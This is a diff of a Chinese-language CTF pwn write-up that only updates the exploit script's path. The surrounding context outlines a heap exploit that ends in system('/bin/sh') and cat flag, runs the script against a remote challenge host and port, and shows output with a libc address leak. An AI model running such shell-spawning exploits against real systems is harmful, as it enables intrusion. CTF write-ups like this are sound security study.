@@ -132,11 +132,11 @@ free("/bin/sh") -> system("/bin/sh") -> cat flag
 
 ## 6. 完整利用脚本
 
-保存于 `exploits/pwn4.py`，运行：
+保存于 `exploits/pwn/pwn4.py`，运行：
 
 ```bash
 # 远端（端口可换）
-.venv/bin/python exploits/pwn4.py 49.232.142.230 11970
+.venv/bin/python exploits/pwn/pwn4.py 49.232.142.230 11970
 ```
 
 ```python
@@ -227,7 +227,7 @@ for i in range(6):
 ## 7. 实际输出
 
 ```
-$ .venv/bin/python exploits/pwn4.py 49.232.142.230 11970
+$ .venv/bin/python exploits/pwn/pwn4.py 49.232.142.230 11970
 [*] attempt 1
 [+] Opening connection to 49.232.142.230 on port 11970: Done
 [+] leak=0x7fcbe17cfbe0 libc=0x7fcbe15e3000
